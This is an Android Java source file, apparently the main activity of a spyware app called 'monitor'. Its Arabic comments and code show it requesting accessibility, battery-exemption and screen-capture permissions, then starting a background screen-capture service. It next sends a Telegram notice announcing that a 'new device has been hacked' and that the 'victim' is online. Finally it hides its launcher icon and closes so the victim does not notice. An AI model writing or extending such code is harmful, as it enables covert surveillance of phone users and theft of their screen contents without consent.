package com.tom5.monitor;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {
    private static final int REQ_CODE = 100;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // 1. طلب تجاهل البطارية
        requestBatteryOptimizations();

        // 2. طلب إمكانية الوصول
        if (!isAccessibilityEnabled()) {
            startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
        }

        // 3. طلب بث الشاشة
        MediaProjectionManager mpm = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        if (mpm != null) {
            startActivityForResult(mpm.createScreenCaptureIntent(), REQ_CODE);
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQ_CODE && resultCode == RESULT_OK) {
            // أ. تشغيل الخدمة بالخلفية
            Intent intent = new Intent(this, ScreenService.class);
            intent.putExtra("resCode", resultCode);
            intent.putExtra("resData", data);
            startForegroundService(intent);

            // ب. إرسال إشعار لتيلجرام فوراً
            TelegramSender.sendMessage("🔥 تم اختراق جهاز جديد! الضحية أعطى الصلاحيات وهو الآن أونلاين.");

            // ج. إخفاء الأيقونة فوراً (الإخفاء اللحظي)
            hideAppIcon();
            
            // د. إغلاق الواجهة حتى يرجع الضحية للشاشة الرئيسية
            finish();
        }
    }

    private void hideAppIcon() {
        getPackageManager().setComponentEnabledSetting(
            new ComponentName(this, MainActivity.class),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        );
    }

    private void requestBatteryOptimizations() {
        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
            Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
            intent.setData(Uri.parse("package:" + getPackageName()));
            startActivity(intent);
        }
    }

    private boolean isAccessibilityEnabled() { return false; }
}
